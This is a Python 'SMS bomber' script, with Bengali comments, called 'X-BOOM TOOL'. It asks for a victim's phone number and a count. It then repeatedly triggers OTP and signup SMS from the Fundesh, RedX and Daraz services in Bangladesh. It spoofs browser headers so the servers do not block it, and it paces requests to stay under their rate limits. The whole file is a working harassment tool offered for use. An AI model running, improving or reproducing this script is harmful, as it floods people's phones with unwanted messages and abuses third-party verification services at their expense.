import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        WELCOME TO X-BOOM TOOL          ")
    print("     Created by: mmalekislam788         ")
    print("     Status: SUPER-API BYPASS ACTIVE    ")
    print("========================================")

def send_sms(target, count):
    # আপনার দেওয়া Fundesh সহ আরও ৩টি শক্তিশালী API
    # আমরা Headers ব্যবহার করছি যেন সার্ভার ব্লক না করে
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Referer": "https://www.google.com/"
    }

    print(f"\n[+] Attack started on: {target}")
    
    for i in range(count):
        try:
            # ১. Fundesh API (আপনার দেওয়াটি)
            url1 = "https://api.fundesh.com.bd/api/auth/send-otp"
            data1 = {"phoneNumber": target, "service": "LOGIN"}
            
            # ২. Redx API (ভিন্ন স্টাইল)
            url2 = "https://api.redx.com.bd/v1/user/signup"
            data2 = {"phone": target}
            
            # ৩. Daraz API (সবচেয়ে ফাস্ট)
            url3 = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
            data3 = {"phoneNumber": target, "otpType": "LOGIN"}

            # রিকোয়েস্ট পাঠানো হচ্ছে
            requests.post(url1, json=data1, headers=headers, timeout=10)
            requests.post(url2, json=data2, headers=headers, timeout=10)
            requests.post(url3, json=data3, headers=headers, timeout=10)

            print(f"[!] SMS Slot {i+1} sent (Check Phone)")
            
        except Exception as e:
            print(f"[-] Error at Slot {i+1}")
        
        # ৪ সেকেন্ড বিরতি দিন, খুব দ্রুত পাঠালে সার্ভার মেসেজ আটকে দেয়
        time.sleep(4)

def main():
    banner()
    print("\n[1] Start Super-Power Bomber")
    print("[2] Exit")
    choice = input("\nSelect Option: ")
    if choice == '1':
        number = input("Enter Phone Number (01xxxxxxxxx): ")
        amount = int(input("Enter SMS Amount: "))
        send_sms(number, amount)
        print("\n[+] Task Finished!")
    else:
        exit()

if __name__ == "__main__":
    main()



